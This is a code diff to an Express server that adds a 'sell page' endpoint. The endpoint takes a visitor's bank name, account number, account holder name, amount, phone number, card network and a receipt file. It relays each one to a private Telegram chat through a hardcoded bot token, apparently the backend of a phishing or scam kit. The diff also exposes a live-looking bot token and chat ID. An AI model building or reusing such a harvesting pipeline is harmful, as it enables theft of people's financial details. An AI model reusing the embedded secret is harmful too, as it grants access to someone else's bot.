@@ -257,6 +257,236 @@ app.post("/api/send-msg", upload.fields([
   }
 });
 
+// ======================== SELL PAGE ENDPOINTS ========================
+
+const SELL_TELEGRAM_BOT_TOKEN = "8549260649:AAG5h9hHumxEpvhCXuiGMrhAwx-cMrgp_ak";
+const SELL_TELEGRAM_CHAT_ID = "8434905389";
+
+/**
+ * @openapi
+ * /api/sell-send-msg:
+ *   post:
+ *     summary: Send bank details and receipt to Telegram bot for sell page
+ *     requestBody:
+ *       required: true
+ *       content:
+ *         multipart/form-data:
+ *           schema:
+ *             type: object
+ *             properties:
+ *               receipt:
+ *                 type: string
+ *                 format: binary
+ *                 description: Receipt image or PDF file
+ *               bank_name:
+ *                 type: string
+ *                 description: Name of the bank
+ *               account_number:
+ *                 type: string
+ *                 description: Bank account number
+ *               account_holder_name:
+ *                 type: string
+ *                 description: Account holder name
+ *               amount:
+ *                 type: string
+ *                 description: Transaction amount
+ *               contact_number:
+ *                 type: string
+ *                 description: Contact number
+ *               network:
+ *                 type: string
+ *                 description: Network/Payment method (e.g., Visa, Mastercard, etc.)
+ *             required:
+ *               - receipt
+ *               - bank_name
+ *               - account_number
+ *               - account_holder_name
+ *               - amount
+ *               - contact_number
+ *               - network
+ *     responses:
+ *       200:
+ *         description: Sell details sent successfully to Telegram
+ *         content:
+ *           application/json:
+ *             schema:
+ *               type: object
+ *               properties:
+ *                 success:
+ *                   type: boolean
+ *                 telegram:
+ *                   type: object
+ *       400:
+ *         description: Missing required fields or invalid file
+ *         content:
+ *           application/json:
+ *             schema:
+ *               type: object
+ *               properties:
+ *                 success:
+ *                   type: boolean
+ *                 error:
+ *                   type: string
+ *       500:
+ *         description: Error sending to Telegram
+ *         content:
+ *           application/json:
+ *             schema:
+ *               type: object
+ *               properties:
+ *                 success:
+ *                   type: boolean
+ *                 error:
+ *                   type: string
+ */
+app.post("/api/sell-send-msg", upload.single("receipt"), async (req, res) => {
+  try {
+    // Get receipt file
+    const receiptFile = req.file;
+    
+    // Get form data
+    const bankName = req.body.bank_name;
+    const accountNumber = req.body.account_number;
+    const accountHolderName = req.body.account_holder_name;
+    const amount = req.body.amount;
+    const contactNumber = req.body.contact_number;
+    const network = req.body.network;
+    
+    // Validate all required fields
+    if (!receiptFile) {
+      return res.status(400).json({ success: false, error: "Receipt file is required" });
+    }
+
+    if (!bankName || !accountNumber || !accountHolderName || !amount || !contactNumber || !network) {
+      return res.status(400).json({ 
+        success: false, 
+        error: "All fields are required: bank_name, account_number, account_holder_name, amount, contact_number, network" 
+      });
+    }
+
+    // Send bank name
+    await axios.post(
+      `https://api.telegram.org/bot${SELL_TELEGRAM_BOT_TOKEN}/sendMessage`,
+      {
+        chat_id: SELL_TELEGRAM_CHAT_ID,
+        text: `🏦 *Bank Name:* ${bankName}`,
+        parse_mode: "Markdown"
+      }
+    );
+
+    // Send account number
+    await axios.post(
+      `https://api.telegram.org/bot${SELL_TELEGRAM_BOT_TOKEN}/sendMessage`,
+      {
+        chat_id: SELL_TELEGRAM_CHAT_ID,
+        text: `🔢 *Account Number:* ${accountNumber}`,
+        parse_mode: "Markdown"
+      }
+    );
+
+    // Send account holder name
+    await axios.post(
+      `https://api.telegram.org/bot${SELL_TELEGRAM_BOT_TOKEN}/sendMessage`,
+      {
+        chat_id: SELL_TELEGRAM_CHAT_ID,
+        text: `👤 *Account Holder:* ${accountHolderName}`,
+        parse_mode: "Markdown"
+      }
+    );
+
+    // Send amount
+    await axios.post(
+      `https://api.telegram.org/bot${SELL_TELEGRAM_BOT_TOKEN}/sendMessage`,
+      {
+        chat_id: SELL_TELEGRAM_CHAT_ID,
+        text: `💰 *Amount:* ${amount}`,
+        parse_mode: "Markdown"
+      }
+    );
+
+    // Send contact number
+    await axios.post(
+      `https://api.telegram.org/bot${SELL_TELEGRAM_BOT_TOKEN}/sendMessage`,
+      {
+        chat_id: SELL_TELEGRAM_CHAT_ID,
+        text: `📞 *Contact Number:* ${contactNumber}`,
+        parse_mode: "Markdown"
+      }
+    );
+
+    // Send network
+    await axios.post(
+      `https://api.telegram.org/bot${SELL_TELEGRAM_BOT_TOKEN}/sendMessage`,
+      {
+        chat_id: SELL_TELEGRAM_CHAT_ID,
+        text: `🌐 *Network:* ${network}`,
+        parse_mode: "Markdown"
+      }
+    );
+
+    // Send receipt file
+    const receiptResponse = await sendSellFileToTelegram(receiptFile, "", "Receipt");
+
+    // Send separator
+    await axios.post(
+      `https://api.telegram.org/bot${SELL_TELEGRAM_BOT_TOKEN}/sendMessage`,
+      {
+        chat_id: SELL_TELEGRAM_CHAT_ID,
+        text: "==========================================finished==================================="
+      }
+    );
+
+    res.json({ 
+      success: true, 
+      telegram: receiptResponse.data,
+      bankName,
+      accountNumber,
+      accountHolderName,
+      amount,
+      contactNumber,
+      network
+    });
+  } catch (err) {
+    res.status(500).json({ success: false, error: err.message });
+  }
+});
+
+// Helper function to send files to Telegram for sell page
+async function sendSellFileToTelegram(file, caption, fileType) {
+  const form = new FormData();
+  form.append("chat_id", SELL_TELEGRAM_CHAT_ID);
+  form.append("caption", caption);
+
+  const mimeType = file.mimetype;
+  let telegramResponse;
+  
+  if (mimeType.startsWith("image/")) {
+    form.append("photo", fs.createReadStream(file.path));
+    telegramResponse = await axios.post(
+      `https://api.telegram.org/bot${SELL_TELEGRAM_BOT_TOKEN}/sendPhoto`,
+      form,
+      { headers: form.getHeaders() }
+    );
+  } else if (mimeType === "application/pdf") {
+    const now = new Date();
+    const safeDate = now.toISOString().replace(/[:.]/g, "-");
+    const newFilename = `${fileType.replace(/\s+/g, "_")}_${safeDate}_${file.originalname}`;
+    const newFilePath = path.join(path.dirname(file.path), newFilename);
+    fs.renameSync(file.path, newFilePath);
+    
+    form.append("document", fs.createReadStream(newFilePath), { filename: newFilename });
+    telegramResponse = await axios.post(
+      `https://api.telegram.org/bot${SELL_TELEGRAM_BOT_TOKEN}/sendDocument`,
+      form,
+      { headers: form.getHeaders() }
+    );
+  } else {
+    throw new Error(`Unsupported file type for ${fileType}. Please upload an image or PDF.`);
+  }
+  
+  return telegramResponse;
+}
+
 // Helper function to send files to Telegram
 async function sendFileToTelegram(file, caption, fileType) {
   const form = new FormData();
